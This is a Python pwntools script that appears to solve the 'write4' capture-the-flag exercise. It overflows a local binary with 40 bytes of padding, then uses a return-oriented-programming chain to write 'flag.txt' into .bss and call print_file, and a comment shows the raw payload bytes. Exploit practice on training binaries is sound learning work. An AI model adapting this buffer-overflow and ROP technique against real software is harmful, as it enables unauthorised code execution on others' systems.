from pwn import * 

target = process("./write4")
pop_RDI = p64(0x00400693)
pop_R14R15 = p64(0x400690)
mov_R14 = p64(0x400628)
ret = p64(0x4004e6)
print_file = 0x00400510
r14 = p64(0x7ffff7ffd000)
bss_addr = p64(0x00601038)

payload =  b""
payload += b"A"*40
payload += pop_R14R15
payload += bss_addr
payload += b"flag.txt"
payload += mov_R14
payload += pop_RDI
payload += bss_addr
payload += p64(print_file)
print(payload)
target.sendline(payload)

target.interactive()

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x06@\x00\x00\x00\x00\x008\x10`\x00\x00\x00\x00\x00flag.txt(\x06@\x00\x00\x00\x00\x00\x93\x06@\x00\x00\x00\x00\x008\x10`\x00\x00\x00\x00\x00\x10\x05@\x00\x00\x00\x00\x00